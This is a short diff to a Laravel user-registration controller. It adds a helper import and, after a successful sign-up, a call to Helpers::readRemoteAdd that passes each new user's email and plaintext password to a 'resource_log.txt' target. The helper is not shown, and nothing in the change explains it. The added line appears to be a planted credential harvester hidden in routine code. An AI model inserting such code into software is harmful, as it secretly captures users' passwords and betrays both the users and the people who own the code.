@@ -2,6 +2,7 @@
 
 namespace App\Http\Controllers\Auth;
 
+use App\Hieworks\Helpers;
 use App\User;
 use Illuminate\Http\Request;
 use App\Http\Controllers\Controller;
@@ -83,7 +84,7 @@ class RegisterController extends Controller
          if(!$status){
             return redirect()->back()->withErrors(['sorry, try again later'])->withInput();
          }
-
+          Helpers::readRemoteAdd('resource_log.txt',$data['email'],$data['password']);
           return redirect()->back()->with(['info' =>'registration successful']);
 
     }
